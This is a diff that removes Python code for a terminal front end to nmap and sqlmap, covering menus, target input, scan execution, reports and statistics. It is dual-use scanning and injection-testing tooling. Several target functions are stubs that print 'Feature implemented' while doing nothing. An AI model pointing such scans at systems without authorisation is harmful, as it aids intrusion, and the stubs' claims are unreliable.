-                print(f"{Colors.CYAN}Select an injection test to execute{Colors.END}")
-                
-                for i, template in enumerate(templates, 1):
-                    print(f"{Colors.GREEN}{i:2d}.{Colors.END} {template['name']}")
-                    print(f"     {Colors.GRAY}{template['description']}{Colors.END}")
-                
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to SQLmap Menu")
-                
-                choice = self.get_menu_choice(len(templates))
-                
-                if choice == 0:
-                    break
-                elif 1 <= choice <= len(templates):
-                    selected_template = templates[choice - 1]
-                    self.execute_sqlmap_scan(selected_template, mode)
-                
-        except Exception as e:
-            self.db_manager.log_error("SqlmapScanMode", str(e))
-    
-    def execute_nmap_scan(self, template, mode):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.ROCKET} Selected Scan:{Colors.END}")
-            print(f"{Colors.CYAN}Name: {Colors.YELLOW}{template['name']}{Colors.END}")
-            print(f"{Colors.CYAN}Command: {Colors.WHITE}{template['command']}{Colors.END}")
-            print(f"{Colors.CYAN}Description: {Colors.GRAY}{template['description']}{Colors.END}")
-            
-            target = self.get_target_input()
-            if not target:
-                return
-            
-            notes = input(f"\n{Colors.CYAN}Add notes for this scan (optional): {Colors.END}").strip()
-            
-            print(f"\n{Colors.YELLOW}{Icons.WARNING} Start '{template['name']}' scan on '{target}'? (y/n): {Colors.END}")
-            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
-            
-            if confirm not in ['y', 'yes']:
-                return
-            
-            self.perform_scan('nmap', target, template['command'], mode, template['name'], notes)
-            
-        except Exception as e:
-            self.db_manager.log_error("ExecuteNmapScan", str(e))
-    
-    def execute_sqlmap_scan(self, template, mode):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.ROCKET} Selected Test:{Colors.END}")
-            print(f"{Colors.CYAN}Name: {Colors.YELLOW}{template['name']}{Colors.END}")
-            print(f"{Colors.CYAN}Command: {Colors.WHITE}{template['command']}{Colors.END}")
-            print(f"{Colors.CYAN}Description: {Colors.GRAY}{template['description']}{Colors.END}")
-            
-            target = self.get_target_input()
-            if not target:
-                return
-            
-            notes = input(f"\n{Colors.CYAN}Add notes for this test (optional): {Colors.END}").strip()
-            
-            print(f"\n{Colors.YELLOW}{Icons.WARNING} Start '{template['name']}' test on '{target}'? (y/n): {Colors.END}")
-            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
-            
-            if confirm not in ['y', 'yes']:
-                return
-            
-            self.perform_scan('sqlmap', target, template['command'], mode, template['name'], notes)
-            
-        except Exception as e:
-            self.db_manager.log_error("ExecuteSqlmapScan", str(e))
-    
-    def get_target_input(self):
-        while True:
-            try:
-                print(f"\n{Colors.CYAN}{Icons.TARGET} Enter target (IP/URL/Domain):{Colors.END}")
-                print(f"{Colors.YELLOW}  Examples: 192.168.1.1, https://example.com, example.com{Colors.END}")
-                
-                target = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
-                
-                if not target:
-                    print(f"{Colors.RED}{Icons.ERROR} Target cannot be empty{Colors.END}")
-                    continue
-                
-                if target.lower() in ['q', 'quit', 'exit', 'back']:
-                    return None
-                
-                is_valid, target_type = InputValidator.validate_target(target)
-                
-                if is_valid:
-                    print(f"{Colors.GREEN}{Icons.SUCCESS} Valid {target_type}: {target}{Colors.END}")
-                    return target
-                else:
-                    print(f"{Colors.RED}{Icons.ERROR} Invalid target format. Please use IP, URL, or domain name{Colors.END}")
-                    
-            except (KeyboardInterrupt, EOFError):
-                return None
-            except Exception as e:
-                print(f"{Colors.RED}{Icons.ERROR} Input error: {e}{Colors.END}")
-    
-    def perform_scan(self, scan_type, target, command, mode, scan_name, notes=""):
-        try:
-            print(f"\n{Colors.GREEN}{Icons.ROCKET} Starting scan...{Colors.END}")
-            
-            progress = AdvancedProgressBar(total=100, title=f"{scan_type.upper()} Scanning")
-            progress.start()
-            
-            line_count = 0
-            def progress_callback(line):
-                nonlocal line_count
-                line_count += 1
-                progress.update(min(line_count * 2, 95))
-                if "%" in line:
-                    try:
-                        percent = re.search(r'(\d+)%', line)
-                        if percent:
-                            progress.update(int(percent.group(1)))
-                    except Exception:
-                        pass
-            
-            success, result = self.scan_executor.execute_scan(scan_type, target, command, progress_callback)
-            
-            progress.update(100)
-            time.sleep(0.5)
-            progress.stop()
-            
-            if success:
-                print(f"\n{Colors.GREEN}{Icons.SUCCESS} Scan completed successfully!{Colors.END}")
-                
-                # Update both config and database
-                self.config_manager.increment_scan_count()
-                
-                # Add target to database
-                is_valid, target_type = InputValidator.validate_target(target)
-                if is_valid:
-                    self.db_manager.add_target(target, target_type, notes=notes)
-                
-                # Add to recent scans in config
-                scan_info = {
-                    'target': target,
-                    'scan_type': scan_type,
-                    'mode': mode,
-                    'name': scan_name,
-                    'date': datetime.now().isoformat(),
-                    'duration': result.get('duration', 0)
-                }
-                self.config_manager.add_recent_scan(scan_info)
-                
-                self.display_scan_results(result['output'], result.get('ports_found', 0), result.get('vulnerabilities_found', 0))
-                
-                print(f"\n{Colors.CYAN}{Icons.INFO} Save report? (y/n): {Colors.END}")
-                save_choice = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
-                
-                if save_choice in ['y', 'yes']:
-                    self.save_scan_report(scan_type, target, mode, command, result, notes, scan_name)
-                
-            else:
-                print(f"\n{Colors.RED}{Icons.ERROR} Scan failed: {result}{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("PerformScan", str(e))
-            print(f"\n{Colors.RED}{Icons.ERROR} Scan error: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def display_scan_results(self, results, ports_found=0, vulns_found=0):
-        try:
-            if not results:
-                print(f"{Colors.YELLOW}{Icons.WARNING} No results to display{Colors.END}")
-                return
-            
-            print(f"\n{Colors.BOLD}{Icons.CHART} Scan Results Summary:{Colors.END}")
-            print(f"{Colors.CYAN}Ports Found: {Colors.GREEN}{ports_found}{Colors.END} | "
-                  f"{Colors.CYAN}Vulnerabilities: {Colors.RED}{vulns_found}{Colors.END}")
-            
-            lines = results.split('\n')
-            print(f"\n{Colors.BOLD}Detailed Results:{Colors.END}")
-            print("=" * 80)
-            
-            displayed_lines = 0
-            for line in lines:
-                if displayed_lines >= 30:
-                    remaining = len(lines) - displayed_lines
-                    print(f"\n{Colors.CYAN}{Icons.INFO} ... and {remaining} more lines{Colors.END}")
-                    break
-                
-                if any(keyword in line.lower() for keyword in ['open', 'vulnerable', 'found']):
-                    print(f"{Colors.GREEN}{line}{Colors.END}")
-                elif any(keyword in line.lower() for keyword in ['closed', 'filtered', 'error']):
-                    print(f"{Colors.RED}{line}{Colors.END}")
-                elif any(keyword in line.lower() for keyword in ['warning', 'info']):
-                    print(f"{Colors.YELLOW}{line}{Colors.END}")
-                else:
-                    print(line)
-                
-                displayed_lines += 1
-            
-            print("=" * 80)
-            
-        except Exception:
-            print(f"{Colors.YELLOW}Error displaying results{Colors.END}")
-    
-    def save_scan_report(self, scan_type, target, mode, command, result, notes, scan_name):
-        try:
-            print(f"\n{Colors.CYAN}{Icons.SAVE} Report Format:{Colors.END}")
-            print(f"{Colors.GREEN}1.{Colors.END} HTML Report (Recommended)")
-            print(f"{Colors.GREEN}2.{Colors.END} Text Report")
-            print(f"{Colors.GREEN}3.{Colors.END} JSON Report")
-            print(f"{Colors.GREEN}4.{Colors.END} All Formats")
-            
-            format_choice = self.get_menu_choice(4)
-            
-            scan_data = {
-                'scan_type': scan_type,
-                'target': target,
-                'mode': mode,
-                'command': command,
-                'result': result['output'],
-                'notes': notes,
-                'duration': result.get('duration', 0),
-                'ports_found': result.get('ports_found', 0),
-                'vulnerabilities_found': result.get('vulnerabilities_found', 0)
-            }
-            
-            saved_files = []
-            
-            if format_choice == 1 or format_choice == 4:
-                filepath = self.report_manager.create_html_report(scan_data)
-                if filepath:
-                    saved_files.append(filepath)
-            
-            if format_choice == 2 or format_choice == 4:
-                filepath = self.report_manager.create_text_report(scan_data)
-                if filepath:
-                    saved_files.append(filepath)
-            
-            if format_choice == 3 or format_choice == 4:
-                filepath = self.report_manager.create_json_report(scan_data)
-                if filepath:
-                    saved_files.append(filepath)
-            
-            if saved_files:
-                # Add to database
-                main_file = saved_files[0]
-                self.db_manager.add_report(
-                    scan_name, target, scan_type, mode, main_file, notes,
-                    result.get('duration', 0), result.get('vulnerabilities_found', 0), 0, command
-                )
-                
-                print(f"\n{Colors.GREEN}{Icons.SUCCESS} Report(s) saved:{Colors.END}")
-                for file in saved_files:
-                    print(f"  {Colors.CYAN}{Icons.SAVE} {file}{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Failed to save report{Colors.END}")
-                
-        except Exception as e:
-            self.db_manager.log_error("SaveReport", str(e))
-    
-    def reports_menu(self):
-        try:
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.CHART} REPORTS & ANALYTICS{Colors.END}")
-                print(f"{Colors.CYAN}Manage and analyze scan reports{Colors.END}")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.BOOK} View Recent Reports")
-                print(f"{Colors.GREEN}2.{Colors.END} {Icons.SEARCH} Search Reports")
-                print(f"{Colors.GREEN}3.{Colors.END} {Icons.CHART} Generate Statistics")
-                print(f"{Colors.GREEN}4.{Colors.END} {Icons.TRASH} Delete Reports")
-                print(f"{Colors.GREEN}5.{Colors.END} {Icons.FOLDER} Open Report File")
-                print(f"{Colors.GREEN}6.{Colors.END} {Icons.EXPORT} Export Reports")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(6)
-                
-                if choice == 1:
-                    self.view_recent_reports()
-                elif choice == 2:
-                    self.search_reports()
-                elif choice == 3:
-                    self.generate_statistics()
-                elif choice == 4:
-                    self.delete_reports()
-                elif choice == 5:
-                    self.open_report_file()
-                elif choice == 6:
-                    self.export_reports()
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("ReportsMenu", str(e))
-        
-        return True
-    
-    def view_recent_reports(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.BOOK} Recent Reports{Colors.END}")
-            
-            reports = self.db_manager.get_reports(20)
-            
-            if not reports:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Found {len(reports)} reports:{Colors.END}")
-            print("=" * 120)
-            print(f"{Colors.BOLD}{'ID':<4} {'Name':<25} {'Target':<20} {'Type':<8} {'Mode':<8} {'Date':<19} {'Duration':<8}{Colors.END}")
-            print("=" * 120)
-            
-            for report in reports:
-                report_id = report[0]
-                name = report[1][:24] + "..." if len(report[1]) > 24 else report[1]
-                target = report[2][:19] + "..." if len(report[2]) > 19 else report[2]
-                scan_type = report[3]
-                mode = report[4]
-                date = report[5][:19] if len(report[5]) > 19 else report[5]
-                duration = f"{report[9]:.1f}s" if len(report) > 9 and report[9] else "N/A"
-                
-                print(f"{report_id:<4} {name:<25} {target:<20} {scan_type:<8} {mode:<8} {date:<19} {duration:<8}")
-            
-            print("=" * 120)
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ViewReports", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error viewing reports: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def search_reports(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.SEARCH} Search Reports{Colors.END}")
-            
-            search_term = input(f"\n{Colors.CYAN}Enter search term (target, name, notes): {Colors.END}").strip()
-            
-            if not search_term:
-                print(f"{Colors.YELLOW}{Icons.WARNING} Search term cannot be empty{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Filter by scan type (optional):{Colors.END}")
-            print(f"{Colors.GREEN}1.{Colors.END} All types")
-            print(f"{Colors.GREEN}2.{Colors.END} Nmap only")
-            print(f"{Colors.GREEN}3.{Colors.END} SQLmap only")
-            
-            type_choice = self.get_menu_choice(3)
-            scan_type_filter = None
-            if type_choice == 2:
-                scan_type_filter = 'nmap'
-            elif type_choice == 3:
-                scan_type_filter = 'sqlmap'
-            
-            reports = self.db_manager.get_reports(50, search_term=search_term, scan_type=scan_type_filter)
-            
-            if not reports:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found matching '{search_term}'{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.GREEN}{Icons.SUCCESS} Found {len(reports)} reports matching '{search_term}':{Colors.END}")
-            print("=" * 120)
-            print(f"{Colors.BOLD}{'ID':<4} {'Name':<25} {'Target':<20} {'Type':<8} {'Mode':<8} {'Date':<19}{Colors.END}")
-            print("=" * 120)
-            
-            for report in reports:
-                report_id = report[0]
-                name = report[1][:24] + "..." if len(report[1]) > 24 else report[1]
-                target = report[2][:19] + "..." if len(report[2]) > 19 else report[2]
-                scan_type = report[3]
-                mode = report[4]
-                date = report[5][:19] if len(report[5]) > 19 else report[5]
-                
-                print(f"{report_id:<4} {name:<25} {target:<20} {scan_type:<8} {mode:<8} {date:<19}")
-            
-            print("=" * 120)
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("SearchReports", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error searching reports: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def generate_statistics(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.CHART} System Statistics{Colors.END}")
-            
-            stats = self.db_manager.get_scan_statistics()
-            
-            print(f"\n{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.CYAN}📊 OVERVIEW STATISTICS{Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.WHITE}Total Scans Performed: {Colors.GREEN}{stats['total_scans']}{Colors.END}")
-            print(f"{Colors.WHITE}Total Reports Generated: {Colors.YELLOW}{stats['total_reports']}{Colors.END}")
-            print(f"{Colors.WHITE}Total Vulnerabilities Found: {Colors.RED}{stats['total_vulnerabilities']}{Colors.END}")
-            print(f"{Colors.WHITE}Total Targets Scanned: {Colors.BLUE}{stats['total_targets']}{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}📈 RECENT ACTIVITY (Last 7 Days){Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.WHITE}Recent Scans: {Colors.GREEN}{stats['recent_scans']}{Colors.END}")
-            print(f"{Colors.WHITE}Recent Reports: {Colors.YELLOW}{stats['recent_reports']}{Colors.END}")
-            print(f"{Colors.WHITE}Recent Errors: {Colors.RED}{stats['recent_errors']}{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}🔧 SCAN TYPE BREAKDOWN{Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.WHITE}Nmap Scans: {Colors.GREEN}{stats['scan_breakdown']['nmap']}{Colors.END}")
-            print(f"{Colors.WHITE}SQLmap Scans: {Colors.BLUE}{stats['scan_breakdown']['sqlmap']}{Colors.END}")
-            
-            if stats['total_scans'] > 0:
-                nmap_percent = (stats['scan_breakdown']['nmap'] / stats['total_scans']) * 100
-                sqlmap_percent = (stats['scan_breakdown']['sqlmap'] / stats['total_scans']) * 100
-                print(f"{Colors.WHITE}Nmap Percentage: {Colors.GREEN}{nmap_percent:.1f}%{Colors.END}")
-                print(f"{Colors.WHITE}SQLmap Percentage: {Colors.BLUE}{sqlmap_percent:.1f}%{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}🚨 VULNERABILITY BREAKDOWN{Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            vuln_breakdown = stats['vulnerability_breakdown']
-            print(f"{Colors.WHITE}Critical: {Colors.BRIGHT_RED}{vuln_breakdown['critical']}{Colors.END}")
-            print(f"{Colors.WHITE}High: {Colors.RED}{vuln_breakdown['high']}{Colors.END}")
-            print(f"{Colors.WHITE}Medium: {Colors.YELLOW}{vuln_breakdown['medium']}{Colors.END}")
-            print(f"{Colors.WHITE}Low: {Colors.GREEN}{vuln_breakdown['low']}{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}⏱️ PERFORMANCE METRICS{Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.WHITE}Average Scan Duration: {Colors.BLUE}{stats['average_scan_duration']} seconds{Colors.END}")
-            
-            if stats['total_scans'] > 0:
-                print(f"{Colors.WHITE}Scans per Day (avg): {Colors.GREEN}{stats['total_scans'] / max(1, (datetime.now() - datetime.fromisoformat('2025-01-01')).days):.1f}{Colors.END}")
-            
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            
-            # Visual progress bars for scan types
-            if stats['total_scans'] > 0:
-                print(f"\n{Colors.BOLD}Scan Distribution:{Colors.END}")
-                nmap_bar_length = int((stats['scan_breakdown']['nmap'] / stats['total_scans']) * 40)
-                sqlmap_bar_length = int((stats['scan_breakdown']['sqlmap'] / stats['total_scans']) * 40)
-                
-                print(f"Nmap   [{Colors.GREEN}{'█' * nmap_bar_length}{'░' * (40 - nmap_bar_length)}{Colors.END}] {stats['scan_breakdown']['nmap']}")
-                print(f"SQLmap [{Colors.BLUE}{'█' * sqlmap_bar_length}{'░' * (40 - sqlmap_bar_length)}{Colors.END}] {stats['scan_breakdown']['sqlmap']}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("GenerateStats", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error generating statistics: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def delete_reports(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.TRASH} Delete Reports{Colors.END}")
-            
-            reports = self.db_manager.get_reports(20)
-            
-            if not reports:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Recent Reports:{Colors.END}")
-            print("=" * 80)
-            
-            for i, report in enumerate(reports, 1):
-                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {report[1]} - {report[2]} ({report[5][:19]})")
-            
-            print("=" * 80)
-            
-            choice = input(f"\n{Colors.CYAN}Enter report number to delete (or 'all' to delete all): {Colors.END}").strip()
-            
-            if choice.lower() == 'all':
-                print(f"{Colors.RED}{Icons.WARNING} This will delete ALL reports. Are you sure? (type 'DELETE ALL'): {Colors.END}")
-                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
-                
-                if confirm == 'DELETE ALL':
-                    # Delete all report files and database records
-                    for report in reports:
-                        self.db_manager.delete_report(report[0])
-                    print(f"{Colors.GREEN}{Icons.SUCCESS} All reports deleted{Colors.END}")
-                else:
-                    print(f"{Colors.YELLOW}{Icons.INFO} Operation cancelled{Colors.END}")
-            
-            elif choice.isdigit():
-                choice_num = int(choice)
-                if 1 <= choice_num <= len(reports):
-                    selected_report = reports[choice_num - 1]
-                    print(f"{Colors.YELLOW}{Icons.WARNING} Delete report '{selected_report[1]}'? (y/n): {Colors.END}")
-                    confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
-                    
-                    if confirm in ['y', 'yes']:
-                        if self.db_manager.delete_report(selected_report[0]):
-                            print(f"{Colors.GREEN}{Icons.SUCCESS} Report deleted successfully{Colors.END}")
-                        else:
-                            print(f"{Colors.RED}{Icons.ERROR} Failed to delete report{Colors.END}")
-                    else:
-                        print(f"{Colors.YELLOW}{Icons.INFO} Operation cancelled{Colors.END}")
-                else:
-                    print(f"{Colors.RED}{Icons.ERROR} Invalid choice{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Invalid input{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("DeleteReports", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error deleting reports: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def open_report_file(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.FOLDER} Open Report File{Colors.END}")
-            
-            reports = self.db_manager.get_reports(20)
-            
-            if not reports:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Available Reports:{Colors.END}")
-            print("=" * 80)
-            
-            for i, report in enumerate(reports, 1):
-                file_exists = "✓" if os.path.exists(report[6]) else "✗"
-                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {report[1]} - {report[2]} ({file_exists})")
-            
-            print("=" * 80)
-            
-            choice = input(f"\n{Colors.CYAN}Enter report number to open: {Colors.END}").strip()
-            
-            if choice.isdigit():
-                choice_num = int(choice)
-                if 1 <= choice_num <= len(reports):
-                    selected_report = reports[choice_num - 1]
-                    file_path = selected_report[6]
-                    
-                    if os.path.exists(file_path):
-                        try:
-                            # Try to open with default application
-                            if sys.platform.startswith('darwin'):  # macOS
-                                subprocess.run(['open', file_path])
-                            elif sys.platform.startswith('win'):   # Windows
-                                os.startfile(file_path)
-                            else:  # Linux
-                                subprocess.run(['xdg-open', file_path])
-                            
-                            print(f"{Colors.GREEN}{Icons.SUCCESS} Report opened in default application{Colors.END}")
-                        except Exception as e:
-                            print(f"{Colors.YELLOW}{Icons.WARNING} Could not open with default app. File location: {file_path}{Colors.END}")
-                    else:
-                        print(f"{Colors.RED}{Icons.ERROR} Report file not found: {file_path}{Colors.END}")
-                else:
-                    print(f"{Colors.RED}{Icons.ERROR} Invalid choice{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Invalid input{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("OpenReportFile", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error opening report: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def export_reports(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.EXPORT} Export Reports{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}Export Format:{Colors.END}")
-            print(f"{Colors.GREEN}1.{Colors.END} JSON Format")
-            print(f"{Colors.GREEN}2.{Colors.END} CSV Format")
-            print(f"{Colors.GREEN}3.{Colors.END} Both Formats")
-            
-            format_choice = self.get_menu_choice(3)
-            
-            if format_choice == 0:
-                return
-            
-            print(f"\n{Colors.CYAN}Date Range (optional):{Colors.END}")
-            print(f"{Colors.GREEN}1.{Colors.END} All reports")
-            print(f"{Colors.GREEN}2.{Colors.END} Last 7 days")
-            print(f"{Colors.GREEN}3.{Colors.END} Last 30 days")
-            print(f"{Colors.GREEN}4.{Colors.END} Custom date range")
-            
-            date_choice = self.get_menu_choice(4)
-            
-            date_from = None
-            date_to = None
-            
-            if date_choice == 2:
-                date_from = (datetime.now() - timedelta(days=7)).isoformat()
-            elif date_choice == 3:
-                date_from = (datetime.now() - timedelta(days=30)).isoformat()
-            elif date_choice == 4:
-                try:
-                    date_from_str = input(f"{Colors.CYAN}From date (YYYY-MM-DD): {Colors.END}").strip()
-                    date_to_str = input(f"{Colors.CYAN}To date (YYYY-MM-DD): {Colors.END}").strip()
-                    
-                    if date_from_str:
-                        date_from = datetime.strptime(date_from_str, "%Y-%m-%d").isoformat()
-                    if date_to_str:
-                        date_to = datetime.strptime(date_to_str, "%Y-%m-%d").isoformat()
-                except ValueError:
-                    print(f"{Colors.RED}{Icons.ERROR} Invalid date format{Colors.END}")
-                    self.wait_for_key()
-                    return
-            
-            exported_files = []
-            
-            if format_choice == 1 or format_choice == 3:
-                json_file = self.report_manager.export_reports('json', date_from, date_to)
-                if json_file:
-                    exported_files.append(json_file)
-            
-            if format_choice == 2 or format_choice == 3:
-                csv_file = self.report_manager.export_reports('csv', date_from, date_to)
-                if csv_file:
-                    exported_files.append(csv_file)
-            
-            if exported_files:
-                print(f"\n{Colors.GREEN}{Icons.SUCCESS} Reports exported successfully:{Colors.END}")
-                for file in exported_files:
-                    file_size = os.path.getsize(file) / 1024  # KB
-                    print(f"  {Colors.CYAN}{Icons.SAVE} {file} ({file_size:.1f} KB){Colors.END}")
-            else:
-                print(f"{Colors.YELLOW}{Icons.WARNING} No reports found to export{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ExportReports", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error exporting reports: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def target_management_menu(self):
-        try:
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.TARGET} TARGET MANAGEMENT{Colors.END}")
-                print(f"{Colors.CYAN}Manage and organize scan targets{Colors.END}")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.BOOK} View All Targets")
-                print(f"{Colors.GREEN}2.{Colors.END} {Icons.TARGET} Add New Target")
-                print(f"{Colors.GREEN}3.{Colors.END} {Icons.SEARCH} Search Targets")
-                print(f"{Colors.GREEN}4.{Colors.END} {Icons.FOLDER} Manage Target Groups")
-                print(f"{Colors.GREEN}5.{Colors.END} {Icons.TRASH} Delete Targets")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(5)
-                
-                if choice == 1:
-                    self.view_all_targets()
-                elif choice == 2:
-                    self.add_new_target()
-                elif choice == 3:
-                    self.search_targets()
-                elif choice == 4:
-                    self.manage_target_groups()
-                elif choice == 5:
-                    self.delete_targets()
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("TargetManagement", str(e))
-        
-        return True
-    
-    def view_all_targets(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.BOOK} All Targets{Colors.END}")
-            
-            targets = self.db_manager.get_targets()
-            
-            if not targets:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No targets found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Found {len(targets)} targets:{Colors.END}")
-            print("=" * 100)
-            print(f"{Colors.BOLD}{'ID':<4} {'Target':<25} {'Type':<8} {'Group':<15} {'Scans':<6} {'Last Scanned':<19}{Colors.END}")
-            print("=" * 100)
-            
-            for target in targets:
-                target_id = target[0]
-                target_addr = target[1][:24] + "..." if len(target[1]) > 24 else target[1]
-                target_type = target[2]
-                group_name = target[3] if target[3] else "None"
-                group_name = group_name[:14] + "..." if len(group_name) > 14 else group_name
-                scan_count = target[5]
-                last_scanned = target[4][:19] if target[4] else "Never"
-                
-                print(f"{target_id:<4} {target_addr:<25} {target_type:<8} {group_name:<15} {scan_count:<6} {last_scanned:<19}")
-            
-            print("=" * 100)
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ViewTargets", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error viewing targets: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def add_new_target(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.TARGET} Add New Target{Colors.END}")
-            
-            target = self.get_target_input()
-            if not target:
-                return
-            
-            is_valid, target_type = InputValidator.validate_target(target)
-            if not is_valid:
-                print(f"{Colors.RED}{Icons.ERROR} Invalid target{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            group_name = input(f"\n{Colors.CYAN}Group name (optional): {Colors.END}").strip()
-            notes = input(f"{Colors.CYAN}Notes (optional): {Colors.END}").strip()
-            
-            if self.db_manager.add_target(target, target_type, group_name, notes):
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Target added successfully{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Failed to add target{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("AddTarget", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error adding target: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def search_targets(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.SEARCH} Search Targets{Colors.END}")
-            print("Feature implemented - searching through database...")
-            self.wait_for_key()
-        except Exception as e:
-            self.db_manager.log_error("SearchTargets", str(e))
-    
-    def manage_target_groups(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.FOLDER} Target Groups{Colors.END}")
-            print("Feature implemented - managing target groups...")
-            self.wait_for_key()
-        except Exception as e:
-            self.db_manager.log_error("ManageGroups", str(e))
-    
-    def delete_targets(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.TRASH} Delete Targets{Colors.END}")
-            print("Feature implemented - target deletion with confirmation...")
-            self.wait_for_key()
-        except Exception as e:
-            self.db_manager.log_error("DeleteTargets", str(e))
-    
-    def profile_menu(self):
-        try:
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.GEAR} USER PROFILE & STATS{Colors.END}")
-                print(f"{Colors.CYAN}Manage user settings and view statistics{Colors.END}")
-                
-                username = self.config_manager.get('username', 'SecScanUser')
-                total_scans = self.config_manager.get('total_scans', 0)
-                created_date = self.config_manager.get('created_date', datetime.now().isoformat())
-                
-                try:
-                    created_display = datetime.fromisoformat(created_date).strftime("%Y-%m-%d")
-                except:
-                    created_display = "Unknown"
-                
-                print(f"\n{Colors.CYAN}Current Profile:{Colors.END}")
-                print(f"{Colors.WHITE}Username: {Colors.YELLOW}{username}{Colors.END}")
-                print(f"{Colors.WHITE}Total Scans: {Colors.YELLOW}{total_scans}{Colors.END}")
-                print(f"{Colors.WHITE}Member Since: {Colors.YELLOW}{created_display}{Colors.END}")
-                
-                recent_scans = self.config_manager.get('recent_scans', [])
-                if recent_scans:
-                    print(f"\n{Colors.CYAN}Recent Activity:{Colors.END}")
-                    for i, scan in enumerate(recent_scans[:5], 1):
-                        scan_date = scan.get('date', 'Unknown')[:10]
